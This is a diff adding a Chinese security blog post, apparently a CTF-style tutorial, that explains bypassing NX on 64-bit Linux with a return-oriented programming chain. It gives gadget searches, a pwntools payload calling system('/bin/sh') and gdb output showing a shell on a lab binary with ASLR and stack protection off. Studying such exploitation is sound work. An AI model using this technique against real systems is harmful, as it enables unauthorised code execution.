@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（五） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（五） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/780/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（五）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-24 12:46"><i class="iconfont icon-date"></i>2017-10-24 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>NX 不可执行是一项重要的漏洞利用缓解措施，为了绕过 NX 我们需要利用已有的可执行区域的代码片段来辅助完整漏洞利用。</p>
+
+<p>这次还是需要禁用 ASLR，编译参数为 <code class="highlighter-rouge">gcc -g -O0 -fno-stack-protector -o vuln main.c</code></p>
+
+<p>在 32 位系统中，函数调用参数都是通过栈来传递的，而在 64 位系统中，函数参数是优先使用寄存器来传递的，当参数少于 7 个时，参数从左到右放入寄存器 rdi, rsi, rdx, rcx, r8, r9，如果超过 7 个，剩下的参数还是使用栈来传递。</p>
+
+<p>在 32 位系统中，因为栈是相对容易控制的，我们可以控制栈为函数参数的形式，然后覆盖返回地址为已有的函数地址，比如 libc 中的 system 函数，这样就可以实现任意命令执行了。但是在 64 位系统中，控制了栈是没有用的，必须要控制寄存器才可以，除非是函数不需要参数。所以我们需要找到一些已有的指令片段，比如 <code class="highlighter-rouge">pop rdi</code>，会把栈中的参数转移到寄存器中，这样逐步的控制所需的所有寄存器，我们称这种指令片段为 gadget。</p>
+
+<h2 id="需要什么">需要什么</h2>
+
+<p>以执行 <code class="highlighter-rouge">system("/bin/sh")</code> 为例</p>
+
+<ul>
+  <li><code class="highlighter-rouge">system</code> 函数的地址</li>
+  <li>要执行的函数参数，这里是 <code class="highlighter-rouge">/bin/sh</code>，需要在内存中放置或者找到一个已有的。</li>
+  <li>一个可以把 <code class="highlighter-rouge">/bin/sh</code> 放入 rdi 寄存器的 gadget。</li>
+</ul>
+
+<h2 id="systembinsh"><code class="highlighter-rouge">system("/bin/sh")</code></h2>
+
+<p><code class="highlighter-rouge">system</code> 函数的地址可以简单获得</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p system
+$1 = {&lt;text variable, no debug info&gt;} 0x400550 &lt;system@plt&gt;
+</code></pre>
+</div>
+
+<p>而寻找 <code class="highlighter-rouge">/bin/sh</code> 可以使用 <code class="highlighter-rouge">find</code> 命令</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
+</code></pre>
+</div>
+
+<p>发现 libc 中有一个，而 <code class="highlighter-rouge">student</code> 内存我们可以控制，也可以自己放置一个，这次先使用 libc 中的。</p>
+
+<h2 id="gadget-的选择">gadget 的选择</h2>
+
+<p>我们需要一个能把 <code class="highlighter-rouge">0x7ffff7b99d17</code> 放入寄存器的 gadget</p>
+
+<p><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 是一个寻找 gadget 的工具，安装后可以使用下面的命令来寻找</p>
+
+<p>可以看到结果是</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep rdi
+0x0000000000400803 : pop rdi ; ret
+</code></pre>
+</div>
+
+<p>发现结果非常理想， <code class="highlighter-rouge">pop rdi; ret;</code> 可以复制参数到寄存器，其次是 <code class="highlighter-rouge">ret</code> 可以让程序再回到我们控制的地址上继续后续的执行。</p>
+
+<h2 id="shellcode">shellcode</h2>
+
+<p>仿照之前的写法，我们很简单就可以写出 shellcode</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span><span class="p">)</span>
+<span class="c"># pop rdi; ret</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400803</span><span class="p">)</span>
+<span class="c"># /bin/sh</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7ffff7b99d17</span><span class="p">)</span>
+<span class="c"># system</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400550</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">shellcode</span>
+</code></pre>
+</div>
+
+<h2 id="分析">分析</h2>
+
+<p>这个栈布局已经是很清楚了</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0016| 0x7fffffffe2f0 ('A' &lt;repeats 88 times&gt;, "\003\b@")
+0024| 0x7fffffffe2f8 ('A' &lt;repeats 80 times&gt;, "\003\b@")
+0032| 0x7fffffffe300 ('A' &lt;repeats 72 times&gt;, "\003\b@")
+0040| 0x7fffffffe308 ('A' &lt;repeats 64 times&gt;, "\003\b@")
+0048| 0x7fffffffe310 ('A' &lt;repeats 56 times&gt;, "\003\b@")
+0056| 0x7fffffffe318 ('A' &lt;repeats 48 times&gt;, "\003\b@")
+0064| 0x7fffffffe320 ('A' &lt;repeats 40 times&gt;, "\003\b@")
+0072| 0x7fffffffe328 ('A' &lt;repeats 32 times&gt;, "\003\b@")
+0080| 0x7fffffffe330 ('A' &lt;repeats 24 times&gt;, "\003\b@")
+0088| 0x7fffffffe338 ('A' &lt;repeats 16 times&gt;, "\003\b@")
+0096| 0x7fffffffe340 ("AAAAAAAA\003\b@")
+0104| 0x7fffffffe348 --&gt; 0x400803 (&lt;__libc_csu_init+99&gt;:	pop    rdi)
+0112| 0x7fffffffe350 --&gt; 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
+0120| 0x7fffffffe358 --&gt; 0x400550 (&lt;system@plt&gt;:	jmp    QWORD PTR [rip+0x200aca]        # 0x601020)
+</code></pre>
+</div>
+
+<p>在 GDB 中运行，可以看到 <code class="highlighter-rouge">/bin/dash</code> 被执行，其实 <code class="highlighter-rouge">/bin/sh</code> 就仅仅是它的一个符号链接。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
+0x7fffffffe2f0What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+[New process 4824]
+process 4824 is executing new program: /bin/dash
+[New process 4825]
+process 4825 is executing new program: /bin/dash
+[Inferior 3 (process 4825) exited normally]
+Warning: not running or target is remote
+</code></pre>
+</div>
+
+<p>会发现两个 <code class="highlighter-rouge">/bin/dash</code> 的原因是 <code class="highlighter-rouge">system</code> 函数的原理是 <code class="highlighter-rouge">/bin/sh -c $cmd</code>，所以会先启动一个 <code class="highlighter-rouge">/bin/sh</code>，然后 <code class="highlighter-rouge">execve</code> 想运行的命令，这里还是 <code class="highlighter-rouge">/bin/sh</code>。</p>
+
+<p>因为禁用 ASLR 的原因，libc 的加载地址不变，这个 shellcode 也是可以直接运行的</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  new (cat in.txt; cat) |./vuln
+0x7fffffffe360What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+id
+uid=1000(virusdefender) gid=1000(virusdefender) groups=1000(virusdefender),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+</code></pre>
+</div>
+
+<p>当然这个 gadget 也不唯一，比如 <code class="highlighter-rouge">python Ropper.py --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop|call"</code> 得到的 <code class="highlighter-rouge">0x00000000001073d9: pop rax; pop rdi; call rax;</code> 也非常好用。</p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li><a href="https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/">https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/23537552">https://zhuanlan.zhihu.com/p/23537552</a></li>
+</ul>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（五）&article_id=/index.php/archives/780/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
